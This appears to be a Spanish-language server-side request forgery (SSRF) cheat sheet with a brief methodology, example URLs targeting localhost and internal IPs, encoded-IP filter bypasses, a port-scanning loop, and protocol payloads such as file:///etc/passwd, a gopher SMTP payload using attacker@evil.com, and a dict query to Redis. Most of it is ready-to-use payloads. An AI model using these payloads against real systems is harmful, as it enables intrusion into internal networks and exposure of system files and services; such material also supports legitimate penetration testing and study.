
### Metodología

1. **Identificar funcionalidad vulnerable**: Buscar parámetros que hagan requests (webhooks, fetch, proxy)
2. **Probar acceso a localhost**: `http://127.0.0.1`, `http://localhost`
3. **Escanear red interna**: Probar diferentes IP y puertos internos
4. **Bypassear filtros**: Usar representaciones alternativas de IP
5. **Explotar servicios internos**: Acceder a *APIS*, *admin panels*, *metadata services*

### SSRF básico
```ruby
http://ejemplo.com/fetch?url=http://localhost/admin
http://ejemplo.com/fetch?url=http://127.0.0.1/admin
http://ejemplo.com/fetch?url=http://192.168.1.1
```


***Objetivo***

Acceder a recursos internos no expuestos públicamente.

### Bypasses de filtros de localhost

```ruby
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://127.1
http://2130706433 #--> (decimal)
http://0x7f000001 #--> (hexadecimal)
http://017700000001 #--> (octal)
http://127.0.0.1.nip.io
```


### SSRF para escaneo de puertos internos

```ruby
# Probar diferentes puertos
for port in range(1, 1000):
    url = f"http://vulnerable.com/fetch?url=http://localhost:{port}"
```


### Protocolos útiles para SSRF

```bash
# File protocol
file:///etc/passwd

# Gopher (para SMTP, Redis, etc)
gopher://localhost:25/_MAIL%20FROM:attacker@evil.com

# Dict protocol
dict://localhost:6379/INFO

# FTP
ftp://internal-server/file.txt
```

